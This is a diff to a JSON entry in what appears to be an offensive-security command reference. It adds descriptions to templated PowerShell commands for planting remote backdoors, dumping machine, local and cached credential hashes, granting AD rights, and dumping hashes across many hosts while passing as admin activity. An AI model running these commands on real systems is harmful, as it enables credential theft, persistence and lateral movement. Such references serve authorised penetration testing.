@@ -32,31 +32,38 @@
   "variations": [
     {
       "label": "PowerShell Remoting backdoor",
-      "command": "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host> -Verbose"
+      "command": "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host> -Verbose",
+      "description": "PowerShell Remoting backdoor. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Remote registry backdoor (read machine secrets)",
-      "command": "Add-RemoteRegBackdoor -ComputerName <host> -Trustee <user> -Verbose"
+      "command": "Add-RemoteRegBackdoor -ComputerName <host> -Trustee <user> -Verbose",
+      "description": "Remote registry backdoor (read machine secrets). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Retrieve the machine account hash remotely",
-      "command": "Get-RemoteMachineAccountHash -ComputerName <host> -Verbose"
+      "command": "Get-RemoteMachineAccountHash -ComputerName <host> -Verbose",
+      "description": "Retrieve the machine account hash remotely. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Set-ADACL - grant rights on an AD object (RACE)",
-      "command": "Set-ADACL -SamAccountName <user> -DistinguishedName <object_dn> -Right <right> -Verbose"
+      "command": "Set-ADACL -SamAccountName <user> -DistinguishedName <object_dn> -Right <right> -Verbose",
+      "description": "Set-ADACL - grant rights on an AD object (RACE). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Retrieve local account hashes remotely",
-      "command": "Get-RemoteLocalAccountHash -ComputerName <host> -Verbose"
+      "command": "Get-RemoteLocalAccountHash -ComputerName <host> -Verbose",
+      "description": "Retrieve local account hashes remotely. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Retrieve domain cached credentials",
-      "command": "Get-RemoteCachedCredential -ComputerName <host> -Verbose"
+      "command": "Get-RemoteCachedCredential -ComputerName <host> -Verbose",
+      "description": "Retrieve domain cached credentials. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Dump hashes across many hosts (Get-PassHashes)",
-      "command": "Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <hostlist>)"
+      "command": "Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <hostlist>)",
+      "description": "Executes a command or script block on a remote machine via PowerShell Remoting (WinRM). Uses the trusted PSRemoting channel for lateral movement - appears as legitimate admin activity."
     }
   ],
   "steps": [
